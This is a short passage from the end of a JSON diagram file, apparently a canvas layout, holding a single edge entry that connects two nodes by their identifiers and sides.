		{"id":"7b24a3a1cdc0ec72","fromNode":"656cfcf98204b530","fromSide":"right","toNode":"b21d8082f02d74a1","toSide":"left"}
	]
}